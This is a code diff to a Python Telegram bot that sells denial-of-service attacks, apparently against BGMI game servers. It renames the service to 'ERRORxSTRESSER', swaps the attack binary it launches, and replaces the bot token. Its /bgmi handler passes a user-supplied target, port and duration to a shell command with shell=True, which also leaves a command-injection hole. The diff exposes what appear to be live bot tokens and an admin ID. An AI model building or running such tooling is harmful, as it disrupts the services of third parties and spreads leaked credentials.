@@ -6,7 +6,7 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7668634322:AAG9VeqvWU09XSQJLkPuQoBHdRCTSF25AVw')
+bot = telebot.TeleBot('7659548479:AAH1Fqrdot8aCWFpskc2xyoo8vDKZyondQg')
 
 # Admin user IDs
 admin_id = {"5666606072"}
@@ -236,7 +236,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./soulcrack {target} {port} {time} 200"
+                full_command = f"./sun {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -294,7 +294,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Professor's DDoS Service DDoS Bot, {user_name}!\nFeel Free to Explore.
+    response = f'''👋🏻Welcome to ERRORxSTRESSER Bot, {user_name}!\nFeel Free to Explore.
 \n🤖Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
